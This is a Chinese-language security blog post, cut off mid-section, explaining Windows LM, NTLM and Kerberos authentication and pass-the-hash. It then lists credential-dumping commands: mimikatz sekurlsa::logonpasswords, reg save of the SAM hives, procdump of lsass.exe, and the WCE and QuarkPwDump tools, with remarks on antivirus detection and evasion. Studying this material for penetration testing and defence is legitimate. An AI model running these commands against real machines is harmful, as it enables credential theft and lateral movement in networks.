<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="theme-color" content="#ffffff"><link rel="manifest" href="/manifest.json?v=2.1.1"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="一、前言       在学习Windows时，我们需要去了解一些基本的Windows知识，这里借用网络上的一些优秀文章进行学习。">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows认证及哈希传递攻击">
<meta property="og:url" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/index.html">
<meta property="og:site_name" content="CRLF&#39;s Blog">
<meta property="og:description" content="一、前言       在学习Windows时，我们需要去了解一些基本的Windows知识，这里借用网络上的一些优秀文章进行学习。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/bdrz.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/wlrz.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/yrz.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k2.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k3.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k4.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191019215841-8e69d392-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215856-97b29a6a-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215919-a57e0558-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215937-b015ae26-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215953-b95bfb34-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220011-c4848af8-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220033-d1b0c46c-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220048-da7a7f34-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220101-e2685c84-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220117-ebe60360-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220136-f6f51610-f278-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220158-03f03174-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220242-1e262c56-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220317-3352fa32-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220333-3c876908-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220348-45dd1606-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220408-51c107fc-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220425-5ba8e794-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220444-66d69b16-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220502-71e2c002-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220523-7dfc44c6-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220541-88c14d8e-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220649-b1901d94-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220709-bd41bcec-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220729-c91f6bb8-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220755-d90d4f4a-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220821-e83d39ee-f279-1.png">
<meta property="og:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220846-f74b0cb8-f279-1.png">
<meta property="article:published_time" content="2021-02-18T02:56:26.000Z">
<meta property="article:modified_time" content="2021-02-18T06:10:57.326Z">
<meta property="article:author" content="crlf">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/bdrz.png"><title>Windows认证及哈希传递攻击 | CRLF's Blog</title><link ref="canonical" href="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":4},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: {"avoidBanner":true},
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: {"switchPost":true},
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="CRLF's Blog" type="application/atom+xml">
</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">CRLF's Blog</div><div class="header-banner-info__subtitle">临渊羡鱼,不如退而结网,水至清则无鱼,人至察则无徒。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><div class="sticky-top" data-popover="置顶文章" data-popover-pos="up"><span class="sticky-top__icon"><i class="fas fa-thumbtack"></i></span></div><h1 class="post-title">Windows认证及哈希传递攻击</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-02-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-18</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h4 id="一、前言">
          <a href="#一、前言" class="heading-link"><i class="fas fa-link"></i></a>一、前言</h4>
      <p>在学习Windows时，我们需要去了解一些基本的Windows知识，这里借用网络上的一些优秀文章进行学习。</p>
<a id="more"></a>

<p><strong>二、Windows身份 认证机制</strong></p>
<p>在Windows中，身份认证机制主要有三种<strong>：LM Hash（Windows2000之前）、NTLM Hash、Kerberos</strong>，下面简单介绍下三种不同的认证方式。</p>
<p><strong>LM Hash：</strong>NTLM Hahs的前身，相对是比较错弱的，生成规则如下：</p>
<ul>
<li>用户的密码被限制为最多14个字符。</li>
<li>用户的密码转换为大写。</li>
<li>密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li>
<li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）</li>
<li>上步骤得到的8byte二组，分别作为DES key为”KGS!@#$%”进行加密。</li>
<li>将二组DES加密后的编码拼接，得到最终LM HASH值。</li>
</ul>
<p>通过这个很明确的看出，进行LM Hash加密时，其中的key值是一个固定值KGS!@#$%，这就意味着它被暴力破解出来的可能性非常大，通过LM Hash的生成机制，还能清楚的看出：<strong>密码是否大于等于7位，因为当位数不足时，后面会用0来补全，所以当密码位数小于7时，最终生成的LM Hash的末尾字符是一个恒定不变的值：AA-D3-B4-35-B5-14-04-EE。</strong></p>
<p>再有就是，它的密码是不区分大小写的，这更增加了被爆破的概率。</p>
<p>在Windows Vista和WindowsServer 2008以前的系统还会使用LM hash，自WindowsVista和Windows Server 2008开始,Windows取消LM hash。</p>
<p><strong>NTLM</strong><br>NTLM(NT LAN Manager)是Windows中最常见的身份认证方式，主要有本地认证和网络认证两种情况。</p>
<p><strong>NTLM Hash</strong><br>在介绍NTLM之前，需要介绍NTLM中最关键的凭证：NTLM Hash。正常的明文密码加密为NTLM Hash的方法如下：</p>
<p>password —-&gt; 十六进制编码 —-&gt; Unicode转换 —-&gt; MD4加密 —-&gt; 得到NTLM Hash</p>
<p>例如：</p>
<p>admin -&gt; hex(16进制编码) = 61646d696e</p>
<p>61646d696e -&gt; Unicode = 610064006d0069006e00</p>
<p>610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</p>
<p><strong>本地认证</strong><br>在本地认证过程中，当用户进行注销、重启、开机等需要认证的操作时，首先Windows会调用winlogon.exe进程（也就是我们平常见到的登录框）接收用户的密码。</p>
<p>之后密码会被传送给进程lsass.exe，该进程会先在内存中存储一份明文密码，然后将明文密码加密为NTLM Hash后，与Windows本地的SAM数据库（%SystemRoot%\system32\config\SAM）中该用户的NTLM Hash对比，如果一致则通过认证。</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/bdrz.png" alt="bdrz"></p>
<p><strong>网络认证</strong></p>
<p>工作组环境<br>网络认证需要使用NTLM协议，该协议基于挑战（Challenge）/响应（Response）机制。</p>
<p>它主要分为协商、质询和验证三个步骤</p>
<ul>
<li><p>协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。</p>
</li>
<li><p>质询，这一步便是Chalenge/Response认证机制的关键之处，下面会介绍这里的步骤。</p>
</li>
<li><p>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源</p>
</li>
<li></li>
</ul>
<p><strong>质询的完整过程</strong> </p>
<p>首先，client会向server发送一个username，这个username是存在于server上的一个用户。</p>
<p>当server接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败，如果存在，将会生成一个16位的随机字符，即Chalenge，然后用查询到的这个user的NTLM hash对Chalenge进行加密，生成Chalenge1，将Chalenge1存储在本地，并将Chalenge传给client。</p>
<p>当client接收到Chalenge时，将发送的username所对应的NTLM hash对Chalenge进行加密即Response，并Response发送给server。</p>
<p>质询到这里就结束了，最后一步就是属于验证的机制了</p>
<p>server在收到Response后，将其与Chalenge1进行比较，如果相同，则验证成功</p>
<p>NTLM V2协议，NTLMv1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash，NTLM v1的Challenge有8位，NTLM v2的Challenge为16位；NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</p>
<p><strong>详细过程</strong></p>
<p>首先客户端向服务端发送用户名以及本机的一些信息(此处更正)<br>服务端接收到客户端的用户名后，先生成一个随机的16位的Challenge（挑战随机数），本地储存后将Challenge返回给客户端<br>客户端接收到服务端发来的Challenge后，使用用户输入密码的NTLM Hash对Challenge进行加密生成Response（也叫Net NTLM Hash），将Response发送给服务端<br>服务端接收到客户端发来的Response，使用数据库中对应用户的NTLM Hash对之前存储的Challenge进行加密，得到的结果与接收的Response进行对比，如果一致则通过认证。</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/wlrz.png" alt="wlrz"></p>
<p><strong>域环境</strong><br>域环境中虽然默认首选是kerberos认证，但是也可以使用NTLM来进行认证。其实NTLM在域环境与工作组环境中的差异不大，区别主要是最终在域控(DC)中完成验证。直接看图比较清晰一点：</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/yrz.png" alt="yrz"></p>
<p><strong>NTLM的缺陷</strong><br>了解整个过程之后我们可以发现，在整个过程中用户的明文密码并没有在客户端和服务端之间传输，取而代之的是NTLM Hash。因此如果攻击者得到了用户的NTLM Hash，那么便可以冒充该用户通过身份验证（也就是说不需要破解出明文密码就可以通过验证），这就是hash传递攻击(Pass The Hash)。</p>
<p><strong>Kerberos</strong><br>Kerberos实际上是一种基于票据（Ticket）的认证方式。客户端要访问服务器的资源，需要首先购买服务端认可的票据。也就是说，客户端在访问服务器之前需要预先买好票，等待服务验票之后才能入场。在这之前，客户端需要先买票，但是这张票不能直接购买，需要一张认购权证。客户端在买票之前需要预先获得一张认购权证。这张认购权证和进入服务器的入场券均有KDC发售。</p>
<p>过程中涉及到的专有名词有：</p>
<p>KDC(Key Distribution Center) : 密钥分发中心<br>KAS(Kerberos Authentication Service) : kerberos认证服务<br>TGT(Ticket Granting Ticket) : 认购权证<br>TGS(Ticket Granting Service) : 票据授予服务<br>ST(Service Ticket) : 服务票据</p>
<p><strong>获取TGT</strong><br>1、客户端要先拿到TGT，然后才能购买ST进行对应服务的访问</p>
<p>2、首先在用户登陆时，Kerberos服务向KDC(域控)发送申请认购权证的请求，内容为登录输入的用户名和经过输入密码加密的Authenticator(用于确认身份的，往下看就会明白)<br>KDC(域控)拿到传来的数据后，会根据用户名到活动目录(Active Directory)的数据库中寻找该用户的密码，然后使用该密码解密加密的Authenticator，然后与原始的Authenticator对比，如果一致，则确认用户身份。</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k1.png" alt="k1"></p>
<p>1、KDC(域控)确认登录用户身份正确后，先生成一个由用户密码加密的加密Logon Session Key（为了确保通信安全）。然后生成TGT(包含用户信息和原始Logon Session Key)，再使用KDC的密钥（即krbrgt用户的密钥）加密TGT生成加密后的TGT。然后将由用户密码加密的加密Logon Session Key和加密后的TGT返回给客户端<br>2、客户端拿到加密Logon Session Key和TGT后，先用自己的密码解密加密Logon Session Key得到原始Logon Session Key，然后将原始Logon Session Key和TGT缓存到本地</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k2.png" alt="k2"></p>
<p><strong>获取ST</strong><br>当用户想要访问某个服务时，会经过以下过程：</p>
<p>1、客户端向TGS请求购买ST，请求内容包括用户名、经Logon Session Key加密的Authenticator、请求访问的服务名、TGT</p>
<p>2、接收到请求后，TGS使用自己的密钥(krbtgt用户的密钥)解密TGT得到用户信息和原始Logon Session Key，然后使用原始Logon Session Key解密出Authenticator，与TGS本地的Authenticator对比一致后确认用户身份。</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k3.png" alt="k3"></p>
<p>1、TGS生成一个经Logon Session Key加密的Service Session Key，然后生成ST（包含请求用户的信息以及原始Logon Session Key），然后将Service Session Key和ST返回给客户端</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/k4.png" alt="k4"></p>
<p>之后的过程就是用户用ST和去访问服务了，个人认为理解到这里就ok了，后面的过程不再过多赘述</p>
<p>Kerberos的缺陷<br>从以上认证过程我们可以发现，Kerberos认证完全依赖于KDC的密钥（即krbtgt用户的密钥）。因此，如果攻击者拿到了krbtgt账号的hash的话，那么他就可以访问域中任何以kerberos协议做身份认证的服务。这就产生了票据传递攻击(Pass The Ticket)。</p>

        <h1 id="Hash抓取">
          <a href="#Hash抓取" class="heading-link"><i class="fas fa-link"></i></a>Hash抓取</h1>
      
        <h2 id="WCE">
          <a href="#WCE" class="heading-link"><i class="fas fa-link"></i></a>WCE</h2>
      <p>该工具可以抓取用户的LM Hash和NTML Hash，需要administrator权限。测试绝大数杀软都会报毒，需要免杀。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -lv</span><br></pre></td></tr></table></div></figure>

<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20191019215841-8e69d392-f278-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191019215841-8e69d392-f278-1.png" alt="img"></a></p>
<p><strong>工具地址：</strong><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/xfmn/wce">https://github.com/xfmn/wce</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="QuarkPwDump">
          <a href="#QuarkPwDump" class="heading-link"><i class="fas fa-link"></i></a>QuarkPwDump</h2>
      <p>也是导出用户LM Hash和NTLM Hash的，测试发现只有360和nod32等少数杀软报了毒，是否需要免杀视具体情况而定。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe -dhl</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215856-97b29a6a-f278-1.png" alt="20191019215856-97b29a6a-f278-1"></p>
<p><strong>工具地址：</strong><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Reg导出注册表本地分析">
          <a href="#Reg导出注册表本地分析" class="heading-link"><i class="fas fa-link"></i></a>Reg导出注册表本地分析</h2>
      <p>这个需要system权限（在我的xp上测试竟然无限蓝屏重启，懵逼了。。），在win2003上可以测试成功：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215919-a57e0558-f278-1.png" alt="20191019215919-a57e0558-f278-1"></p>
<p>然后导入到本地的mimikatz中：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam &#x2F;system:system.hive &#x2F;sam:sam.hive</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215937-b015ae26-f278-1.png" alt="20191019215937-b015ae26-f278-1"></p>

        <h2 id="mimikatz">
          <a href="#mimikatz" class="heading-link"><i class="fas fa-link"></i></a>mimikatz</h2>
      <p>神器不必多说，mimikatz可以抓取上面提到的<code>lsass.exe</code>进程存储在内存中的明文密码，前提是该用户在该服务器上登录过</p>
<p>需要administrator及以上权限，需要免杀</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019215953-b95bfb34-f278-1.png" alt="20191019215953-b95bfb34-f278-1"></p>
<p>可以看到不仅抓取到了本机的administrator的密码，还抓取到了域管理员的密码，在域渗透的过程中会用到</p>
<p><strong>工具地址：</strong><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ProcDump导出数据本地分析">
          <a href="#ProcDump导出数据本地分析" class="heading-link"><i class="fas fa-link"></i></a>ProcDump导出数据本地分析</h2>
      <p>这种方式最大的优势就是免杀，因为ProcDump是微软官方提供的。但缺点也很明显，导出的数据文件可能会很大（但我本地测试的时候速度还是很快的）。需要administrator及以上权限。</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220011-c4848af8-f278-1.png" alt="20191019220011-c4848af8-f278-1"></p>
<p>之后可以下载到本地导入到mimikatz中进行读取</p>
<p>我在xp上导出，在win10上导入会报错</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220033-d1b0c46c-f278-1.png" alt="20191019220033-d1b0c46c-f278-1"></p>
<p>查了一下发现需要注意的一点是导出的平台和导入的平台不同时会报错，可以看一下mimikatz官方的解释：</p>
